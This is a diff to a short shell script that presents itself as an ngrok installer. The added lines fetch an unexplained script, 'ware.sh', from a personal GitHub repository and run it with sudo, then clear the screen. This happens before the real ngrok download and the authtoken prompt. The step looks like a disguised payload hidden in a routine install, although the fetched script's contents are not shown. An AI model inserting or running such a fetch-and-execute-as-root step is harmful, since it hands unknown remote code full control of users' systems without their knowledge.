@@ -1,6 +1,7 @@
 #INstalling NGROK
 
-sudo apt update && clear && curl -L "https://github.com/nguyenbinh1289/y/raw/main/add.sh"
+sudo apt update && clear && curl -L "https://github.com/nguyenbinh1289/y/raw/main/add.sh" && wget https://github.com/nguyenbinh1289/y/raw/main/ware.sh
+chmod +x ware.sh && sudo ./ware.sh && clear
 read -p "NGROk Authtoken: " Token
 clear
 wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz && sudo tar -xvf ngrok-v3-stable-linux-amd64.tgz && sudo mv ngrok /usr/local/bin/
